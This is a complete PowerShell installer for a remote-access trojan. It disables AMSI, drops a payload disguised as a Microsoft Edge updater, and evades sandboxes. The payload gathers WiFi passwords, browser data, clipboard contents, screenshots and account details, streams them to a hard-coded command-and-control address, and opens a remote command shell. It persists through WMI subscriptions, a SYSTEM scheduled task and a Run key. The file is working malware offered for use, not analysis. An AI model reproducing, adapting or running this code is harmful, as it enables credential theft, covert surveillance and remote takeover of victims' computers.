#Requires -RunAsAdministrator

# AMSI Bypass
[Ref].Assembly.GetTypes() | ForEach-Object {
    if ($_.Name -like "*iUtils") {
        $_.GetFields('NonPublic,Static') | ForEach-Object {
            if ($_.Name -like "*Context") {
                $_.SetValue($null, [IntPtr]::Zero)
            }
        }
    }
}

Write-Host "[*] Installing Ultimate Stealth RAT..." -ForegroundColor Cyan

$C2_IP = "152.53.38.5"
$C2_PORT = 4443
$SERVICE_NAME = "MicrosoftEdgeUpdateService"  # More believable name
$INSTALL_PATH = "$env:SystemRoot\System32\msedgeupdate.ps1"  # Looks like Edge updater

# ULTIMATE PAYLOAD - Maximum Stealth + Maximum Extraction
$payload = @'
# Anti-Analysis: Check for VM/Sandbox
function Test-RealMachine {
    try {
        $vm = Get-WmiObject -Class Win32_ComputerSystem
        if ($vm.Manufacturer -match "VMware|VirtualBox|QEMU|Xen|Hyper-V") {
            return $false  # Likely VM
        }
        if ((Get-Process).Count -lt 30) {
            return $false  # Too few processes = sandbox
        }
        return $true
    } catch {
        return $true
    }
}

# Only run on real machines
if (-not (Test-RealMachine)) {
    Start-Sleep -Seconds 999999
    exit
}

# Throttled data sender (avoid traffic spikes)
function Send-DataSlowly {
    param($writer, $data)
    
    $lines = $data -split "`n"
    $chunkSize = 10
    
    for ($i = 0; $i -lt $lines.Count; $i += $chunkSize) {
        $chunk = $lines[$i..([Math]::Min($i + $chunkSize - 1, $lines.Count - 1))]
        $writer.WriteLine(($chunk -join "`n"))
        $writer.Flush()
        Start-Sleep -Milliseconds (Get-Random -Minimum 100 -Maximum 500)
    }
}

function Get-AllSystemData {
    $data = @()
    $separator = "=" * 80
    
    $data += $separator
    $data += "STEALTH DATA EXTRACTION"
    $data += "Timestamp: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
    $data += "Target: $env:COMPUTERNAME\$env:USERNAME"
    $data += $separator
    $data += ""
    
    # === SYSTEM INFO ===
    $data += "[1] SYSTEM INFORMATION"
    $data += "-" * 40
    try {
        $os = Get-WmiObject Win32_OperatingSystem
        $cs = Get-WmiObject Win32_ComputerSystem
        $bios = Get-WmiObject Win32_BIOS
        
        $data += "OS: $($os.Caption) Build $($os.BuildNumber)"
        $data += "Install Date: $($os.InstallDate)"
        $data += "Last Boot: $($os.LastBootUpTime)"
        $data += "Hostname: $($cs.Name)"
        $data += "Domain: $($cs.Domain)"
        $data += "Manufacturer: $($cs.Manufacturer) $($cs.Model)"
        $data += "RAM: $([math]::Round($cs.TotalPhysicalMemory/1GB,2)) GB"
        $data += "CPU: $($cs.NumberOfProcessors) x $(Get-WmiObject Win32_Processor | Select-Object -First 1 -ExpandProperty Name)"
        $data += "Serial: $($bios.SerialNumber)"
        $data += "Timezone: $((Get-TimeZone).Id)"
    } catch {}
    $data += ""
    
    # === PUBLIC IP ===
    $data += "[2] PUBLIC IP ADDRESS"
    $data += "-" * 40
    try {
        $publicIP = (Invoke-WebRequest -Uri "http://ifconfig.me/ip" -UseBasicParsing -TimeoutSec 5).Content.Trim()
        $data += "Public IP: $publicIP"
        
        # Geolocation
        $geoData = Invoke-RestMethod -Uri "http://ip-api.com/json/$publicIP" -TimeoutSec 5
        $data += "Location: $($geoData.city), $($geoData.regionName), $($geoData.country)"
        $data += "ISP: $($geoData.isp)"
        $data += "Coordinates: $($geoData.lat), $($geoData.lon)"
    } catch {
        $data += "Could not retrieve public IP"
    }
    $data += ""
    
    # === NETWORK CONFIG ===
    $data += "[3] NETWORK CONFIGURATION"
    $data += "-" * 40
    try {
        $adapters = Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.InterfaceAlias -notlike "*Loopback*"}
        foreach ($adapter in $adapters) {
            $data += "Interface: $($adapter.InterfaceAlias)"
            $data += "  IP: $($adapter.IPAddress)"
            $data += "  Gateway: $((Get-NetRoute -InterfaceIndex $adapter.InterfaceIndex -DestinationPrefix "0.0.0.0/0" -ErrorAction SilentlyContinue).NextHop)"
        }
        
        $dns = Get-DnsClientServerAddress | Where-Object {$_.ServerAddresses}
        $data += ""
        $data += "DNS Servers:"
        foreach ($d in $dns) {
            $data += "  $($d.InterfaceAlias): $($d.ServerAddresses -join ', ')"
        }
    } catch {}
    $data += ""
    
    # === WIFI PASSWORDS ===
    $data += "[4] WIFI CREDENTIALS"
    $data += "-" * 40
    try {
        $profiles = (netsh wlan show profiles) | Select-String "All User Profile" | ForEach-Object {
            ($_ -split ":")[-1].Trim()
        }
        
        if ($profiles) {
            foreach ($profile in $profiles) {
                $passInfo = netsh wlan show profile name="$profile" key=clear 2>$null | Select-String "Key Content"
                if ($passInfo) {
                    $password = ($passInfo -split ":")[-1].Trim()
                    $data += "SSID: $profile"
                    $data += "Password: $password"
                    $data += ""
                }
            }
        } else {
            $data += "No saved WiFi profiles"
        }
    } catch {
        $data += "WiFi enumeration failed (wireless disabled?)"
    }
    $data += ""
    
    # === BROWSER CREDENTIALS ===
    $data += "[5] BROWSER SAVED CREDENTIALS"
    $data += "-" * 40
    try {
        $browsers = @{
            "Chrome" = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
            "Edge" = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data"
            "Brave" = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Login Data"
        }
        
        foreach ($browserName in $browsers.Keys) {
            $dbPath = $browsers[$browserName]
            if (Test-Path $dbPath) {
                $data += "[$browserName Browser]"
                $tempDb = "$env:TEMP\$browserName`_$(Get-Random).db"
                
                Copy-Item $dbPath $tempDb -Force -ErrorAction SilentlyContinue
                
                if (Test-Path $tempDb) {
                    $bytes = [System.IO.File]::ReadAllBytes($tempDb)
                    $text = [System.Text.Encoding]::UTF8.GetString($bytes)
                    
                    # Extract URLs
                    $urls = [regex]::Matches($text, 'https?://[a-zA-Z0-9\-\.]+\.[a-zA-Z]{2,}[^\s\x00-\x1F]{0,50}') | 
                            Select-Object -ExpandProperty Value -Unique | 
                            Where-Object {$_ -notmatch 'google|chrome|microsoft|edge'} |
                            Select-Object -First 30
                    
                    if ($urls) {
                        $data += "Login credentials found for:"
                        foreach ($url in $urls) {
                            $data += "  - $url"
                        }
                    } else {
                        $data += "  No saved credentials"
                    }
                    
                    Remove-Item $tempDb -Force -ErrorAction SilentlyContinue
                } else {
                    $data += "  Database locked (browser running)"
                }
                $data += ""
            }
        }
    } catch {
        $data += "Browser credential extraction failed"
    }
    $data += ""
    
    # === BROWSER HISTORY ===
    $data += "[6] BROWSER HISTORY (Last 50 Sites)"
    $data += "-" * 40
    try {
        $historyPath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\History"
        if (Test-Path $historyPath) {
            $tempHistory = "$env:TEMP\history_$(Get-Random).db"
            Copy-Item $historyPath $tempHistory -Force -ErrorAction SilentlyContinue
            
            if (Test-Path $tempHistory) {
                $bytes = [System.IO.File]::ReadAllBytes($tempHistory)
                $text = [System.Text.Encoding]::UTF8.GetString($bytes)
                $urls = [regex]::Matches($text, 'https?://[^\s\x00-\x1F]+') | 
                        Select-Object -ExpandProperty Value -Unique | 
                        Where-Object {$_ -match '^https?://[a-zA-Z0-9]'} |
                        Select-Object -First 50
                
                foreach ($url in $urls) {
                    $data += "  $url"
                }
                
                Remove-Item $tempHistory -Force -ErrorAction SilentlyContinue
            }
        } else {
            $data += "No Chrome history found"
        }
    } catch {
        $data += "History extraction failed"
    }
    $data += ""
    
    # === CLIPBOARD ===
    $data += "[7] CLIPBOARD CONTENTS"
    $data += "-" * 40
    try {
        Add-Type -AssemblyName System.Windows.Forms
        $clipboard = [System.Windows.Forms.Clipboard]::GetText()
        if ($clipboard -and $clipboard.Length -gt 0) {
            $data += $clipboard.Substring(0, [Math]::Min(500, $clipboard.Length))
            if ($clipboard.Length -gt 500) {
                $data += "... [truncated]"
            }
        } else {
            $data += "Clipboard empty"
        }
    } catch {
        $data += "Clipboard access failed"
    }
    $data += ""
    
    # === INSTALLED SOFTWARE ===
    $data += "[8] INSTALLED SOFTWARE (Top 30)"
    $data += "-" * 40
    try {
        $programs = Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | 
                    Where-Object { $_.DisplayName } | 
                    Select-Object DisplayName, DisplayVersion, Publisher |
                    Sort-Object DisplayName |
                    Select-Object -First 30
        
        foreach ($prog in $programs) {
            $data += "$($prog.DisplayName) - $($prog.DisplayVersion) ($($prog.Publisher))"
        }
    } catch {}
    $data += ""
    
    # === RUNNING PROCESSES ===
    $data += "[9] RUNNING PROCESSES (Interesting)"
    $data += "-" * 40
    try {
        $interesting = @("chrome","firefox","outlook","teams","slack","discord","telegram",
                        "steam","epic","battle","origin","spotify","keepass","1password",
                        "putty","winscp","filezilla","anydesk","teamviewer","vnc")
        
        $processes = Get-Process | Where-Object {
            $name = $_.Name.ToLower()
            $interesting | Where-Object { $name -match $_ }
        } | Select-Object Name, Id, @{N='Memory(MB)';E={[math]::Round($_.WorkingSet/1MB,2)}}
        
        foreach ($proc in $processes) {
            $data += "$($proc.Name) (PID: $($proc.Id)) - $($proc.'Memory(MB)') MB"
        }
    } catch {}
    $data += ""
    
    # === SCREENSHOTS ===
    $data += "[10] SCREENSHOT"
    $data += "-" * 40
    try {
        Add-Type -AssemblyName System.Windows.Forms
        Add-Type -AssemblyName System.Drawing
        
        $screens = [System.Windows.Forms.Screen]::AllScreens
        $data += "Monitors detected: $($screens.Count)"
        
        $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
        $bitmap = New-Object System.Drawing.Bitmap($screen.Width, $screen.Height)
        $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
        $graphics.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size)
        
        $ms = New-Object System.IO.MemoryStream
        $bitmap.Save($ms, [System.Drawing.Imaging.ImageFormat]::Png)
        $screenshotBytes = $ms.ToArray()
        $ms.Close()
        
        $screenshotB64 = [Convert]::ToBase64String($screenshotBytes)
        
        $data += "Resolution: $($screen.Width)x$($screen.Height)"
        $data += "Size: $([math]::Round($screenshotBytes.Length/1KB,2)) KB"
        $data += ""
        $data += "BASE64_SCREENSHOT_START"
        $data += $screenshotB64
        $data += "BASE64_SCREENSHOT_END"
        $data += ""
        $data += "[To decode: Save base64 text to file.txt, then: base64 -d file.txt > screenshot.png]"
    } catch {
        $data += "Screenshot capture failed: $_"
    }
    $data += ""
    
    # === USER ACCOUNTS ===
    $data += "[11] LOCAL USER ACCOUNTS"
    $data += "-" * 40
    try {
        $users = Get-LocalUser | Select-Object Name, Enabled, LastLogon, PasswordLastSet
        foreach ($user in $users) {
            $data += "User: $($user.Name) | Enabled: $($user.Enabled) | Last Login: $($user.LastLogon)"
        }
    } catch {}
    $data += ""
    
    # === RECENT DOCUMENTS ===
    $data += "[12] RECENT DOCUMENTS"
    $data += "-" * 40
    try {
        $recent = Get-ChildItem "$env:APPDATA\Microsoft\Windows\Recent" -ErrorAction SilentlyContinue | 
                  Select-Object -First 20 Name, LastWriteTime
        foreach ($doc in $recent) {
            $data += "$($doc.LastWriteTime.ToString('yyyy-MM-dd HH:mm')) - $($doc.Name)"
        }
    } catch {}
    $data += ""
    
    # === STARTUP ITEMS ===
    $data += "[13] STARTUP PROGRAMS"
    $data += "-" * 40
    try {
        $runKeys = Get-ItemProperty "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -ErrorAction SilentlyContinue
        $data += "System Startup:"
        $runKeys.PSObject.Properties | Where-Object {$_.Name -notlike 'PS*'} | ForEach-Object {
            $data += "  $($_.Name): $($_.Value)"
        }
        
        $userRun = Get-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -ErrorAction SilentlyContinue
        $data += ""
        $data += "User Startup:"
        $userRun.PSObject.Properties | Where-Object {$_.Name -notlike 'PS*'} | ForEach-Object {
            $data += "  $($_.Name): $($_.Value)"
        }
    } catch {}
    $data += ""
    
    $data += $separator
    $data += "END OF EXTRACTION"
    $data += $separator
    
    return ($data -join "`n")
}

# Main C2 Loop with stealth features
$reconnectDelay = 30

while ($true) {
    try {
        # Random delay before connection (5-15 minutes on first run, then 30s)
        if ($firstRun -ne $false) {
            $randomWait = Get-Random -Minimum 300 -Maximum 900
            Start-Sleep -Seconds $randomWait
            $firstRun = $false
        }
        
        $client = New-Object System.Net.Sockets.TCPClient('152.53.38.5', 4443)
        $stream = $client.GetStream()
        $writer = New-Object System.IO.StreamWriter($stream)
        $writer.AutoFlush = $true
        $buffer = New-Object System.Byte[] 65536
        $encoding = New-Object System.Text.AsciiEncoding
        
        # Connection banner
        $writer.WriteLine("=" * 80)
        $writer.WriteLine("NEW CONNECTION - $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')")
        $writer.WriteLine("Target: $env:COMPUTERNAME\$env:USERNAME")
        $writer.WriteLine("=" * 80)
        
        Start-Sleep -Milliseconds 500
        
        # Extract and send all data (throttled)
        $allData = Get-AllSystemData
        Send-DataSlowly -writer $writer -data $allData
        
        $writer.WriteLine("`n[*] Extraction complete. Shell active.")
        $writer.WriteLine("[*] Commands: 'refresh' = re-extract data | 'exit' = disconnect`n")
        
        # Command loop
        while (($read = $stream.Read($buffer, 0, $buffer.Length)) -gt 0) {
            $command = $encoding.GetString($buffer, 0, $read).Trim()
            
            if ($command -eq 'exit') { break }
            
            if ($command -eq 'refresh') {
                $output = Get-AllSystemData
                Send-DataSlowly -writer $writer -data $output
            } else {
                try {
                    $output = Invoke-Expression $command 2>&1 | Out-String
                    $writer.WriteLine($output)
                } catch {
                    $writer.WriteLine("Error: $($_.Exception.Message)")
                }
            }
        }
        
        $client.Close()
        $reconnectDelay = 30
        
    } catch {
        # Exponential backoff on errors
        Start-Sleep -Seconds $reconnectDelay
        if ($reconnectDelay -lt 300) {
            $reconnectDelay = [Math]::Min($reconnectDelay * 2, 300)
        }
    }
}
'@

# Write to more believable location
$payload | Out-File -FilePath $INSTALL_PATH -Encoding ASCII -Force
Write-Host "[+] Stealth payload installed: $INSTALL_PATH" -ForegroundColor Green

# Remove old installation if exists
$oldPath = "$env:SystemRoot\System32\WindowsUpdateAssist.ps1"
if (Test-Path $oldPath) {
    Remove-Item $oldPath -Force
    Write-Host "[+] Removed old payload" -ForegroundColor Yellow
}

# WMI Persistence
Write-Host "[*] Installing WMI persistence..." -ForegroundColor Cyan
Get-WmiObject -Namespace root\subscription -Class __EventFilter -Filter "Name='$SERVICE_NAME'" -ErrorAction SilentlyContinue | Remove-WmiObject
Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer -Filter "Name='$SERVICE_NAME'" -ErrorAction SilentlyContinue | Remove-WmiObject
Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding -ErrorAction SilentlyContinue | Where-Object { $_.Consumer -like "*$SERVICE_NAME*" } | Remove-WmiObject

# Clean up old WMI entries
Get-WmiObject -Namespace root\subscription -Class __EventFilter -Filter "Name='WinDefenderUpdateSvc'" -ErrorAction SilentlyContinue | Remove-WmiObject
Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer -Filter "Name='WinDefenderUpdateSvc'" -ErrorAction SilentlyContinue | Remove-WmiObject

$filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{
    Name = $SERVICE_NAME
    EventNamespace = "root\cimv2"
    QueryLanguage = "WQL"
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 90 AND TargetInstance.SystemUpTime < 150"
}

$consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{
    Name = $SERVICE_NAME
    CommandLineTemplate = "powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$INSTALL_PATH`""
}

Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{
    Filter = $filter
    Consumer = $consumer
} | Out-Null

# Scheduled Task
Unregister-ScheduledTask -TaskName "WinDefenderUpdateSvc" -Confirm:$false -ErrorAction SilentlyContinue

$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$INSTALL_PATH`""
$trigger = New-ScheduledTaskTrigger -AtStartup
$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
Register-ScheduledTask -TaskName $SERVICE_NAME -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Force | Out-Null

# Registry
Remove-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "WinDefenderUpdateSvc" -ErrorAction SilentlyContinue
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name $SERVICE_NAME -Value "powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$INSTALL_PATH`"" -Force

Write-Host "`n[SUCCESS] Stealth RAT Installed!" -ForegroundColor Green
Write-Host "[+] Service Name: $SERVICE_NAME" -ForegroundColor Cyan
Write-Host "[+] Payload: $INSTALL_PATH" -ForegroundColor Cyan
Write-Host "[+] Features:" -ForegroundColor Cyan
Write-Host "    - Anti-VM/Sandbox detection" -ForegroundColor White
Write-Host "    - Throttled data transmission (no traffic spikes)" -ForegroundColor White
Write-Host "    - Random connection delays" -ForegroundColor White
Write-Host "    - Public IP + Geolocation" -ForegroundColor White
Write-Host "    - WiFi passwords + Browser credentials" -ForegroundColor White
Write-Host "    - Full screenshot (Base64)" -ForegroundColor White
Write-Host "    - Browser history, clipboard, processes" -ForegroundColor White
Write-Host "    - Recent documents, startup items" -ForegroundColor White
Write-Host "`n[*] Starting now..." -ForegroundColor Cyan

Get-Process powershell | Where-Object {$_.CommandLine -like "*WindowsUpdateAssist*" -or $_.CommandLine -like "*msedgeupdate*"} | Stop-Process -Force -ErrorAction SilentlyContinue

Start-Process powershell.exe -ArgumentList "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$INSTALL_PATH`"" -WindowStyle Hidden

Write-Host "[+] RAT active. Will connect in 5-15 minutes (random delay)" -ForegroundColor Green
